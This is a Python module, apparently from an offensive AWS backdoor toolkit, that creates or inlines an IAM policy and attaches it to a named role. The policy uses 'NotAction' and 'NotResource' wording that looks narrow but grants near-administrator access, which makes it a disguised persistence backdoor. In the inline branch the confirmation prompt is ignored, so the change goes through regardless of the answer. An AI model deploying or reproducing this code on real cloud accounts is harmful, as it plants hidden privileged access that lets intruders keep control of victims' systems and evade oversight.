import argparse
import boto3
from botocore.exceptions import ClientError
import json

from .DoorModule import DoorModule

class NotAction(DoorModule):
    class Meta:
        name = 'AWS Not Allow Policy'
        help = 'Add a Administrator Access like policy through NotAction'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-r',
            '--role',
            help='The role to add the policy on',
            required=True
        )

        parser.add_argument(
            '-p',
            '--policy',
            help='The name of the attach policy to add',
            required=True
        )

        parser.add_argument(
            '-i',
            '--inline',
            help='Use inline policy',
            action='store_true'
        )
        args, _ = parser.parse_known_args(argv)
        self.inline = args.inline
        self.policy = args.policy
        self.role = args.role

    def run(self):
        iam = boto3.client('iam')
        policy_document = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "NotAction": [
                        "s3:ListBucket"
                    ],
                    "NotResource": "arn:aws:s3:::cloudtrails-logs-01032004"
                }
            ]
        }
        policy_name = self.policy
        print("[+] The following policy will be added : ")
        print(json.dumps(policy_document, indent=2))
        confirm = input("\n[+] Do you want to apply this change? (yes/no): ").strip().lower()
        if self.inline is False:
            if confirm.lower() not in ("yes", "y"):
                print('[-] Aborting changes, the policy has not been updated')
                return
            try:
                response = iam.create_policy(
                    PolicyName=policy_name,
                    PolicyDocument=json.dumps(policy_document),
                    Description=''
                )
            except ClientError as e:
                print(f"[x] Failed to create the policy : {e}")
                return
            policy_arn = response['Policy']['Arn']
            print(f"[+] Created policy ARN: {policy_arn}")
            print(f"[+] Attaching the policy to {self.role}")
            try:
                iam.attach_role_policy(
                    RoleName=self.role,
                    PolicyArn=policy_arn
                )
            except ClientError as e:
                print(f"[x] Failed to attach the policy : {e}")
                return
            print(f"[+] Successfully created policy {self.policy} and attached to {self.role}")

        else:
            try:
                response = iam.put_role_policy(
                    RoleName=self.role,
                    PolicyName=policy_name,
                    PolicyDocument=json.dumps(policy_document)
                )
            except ClientError as e:
                print(f"[x] Failed to create the inline policy : {e}")
                return
            print(f"[+] Successfully created the inline-policy {policy_name} and attached to {self.role}")



